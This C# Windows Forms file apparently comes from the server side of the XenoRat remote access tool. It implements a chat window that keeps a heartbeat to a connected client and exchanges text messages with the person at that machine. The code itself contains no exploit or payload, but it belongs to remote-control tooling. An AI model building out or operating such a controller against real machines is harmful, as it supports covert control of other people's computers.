using System;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace XenoRatServer.Forms
{
    public partial class Chat : Form
    {
        private Node client;

        public Chat(Node _client)
        {
            client = _client;
            InitializeComponent();
            textBox1.Enabled = false;
            InitializeAsync();
        }

        private async Task InitializeAsync()
        {
            await HeartBeatAsync();
            await RecvThreadAsync();
        }

        private async Task HeartBeatAsync()
        {
            while (client.Connected())
            {
                await Task.Delay(2000);
                await client.SendAsync(new byte[] { 4 });
            }
        }

        private async Task RecvThreadAsync()
        {
            while (client.Connected())
            {
                byte[] data = await client.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                string message = Encoding.UTF8.GetString(data);
                textBox1.Invoke((MethodInvoker)(() =>
                {
                    textBox1.Text += "User: " + message + Environment.NewLine;
                    textBox1.SelectionStart = textBox1.Text.Length;
                    textBox1.ScrollToCaret();
                }));
            }
            if (!IsDisposed)
            {
                Invoke((MethodInvoker)(() =>
                {
                    Close();
                }));
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            string message = textBox2.Text;
            textBox2.Text = "";
            if (!await client.SendAsync(Encoding.UTF8.GetBytes(message)))
            {
                Close();
            }
            textBox1.Text += "You: " + message + Environment.NewLine;
            textBox1.SelectionStart = textBox1.Text.Length;
            textBox1.ScrollToCaret();
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter)
            {
                button1.PerformClick();
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void Chat_Load(object sender, EventArgs e)
        {

        }
    }
}
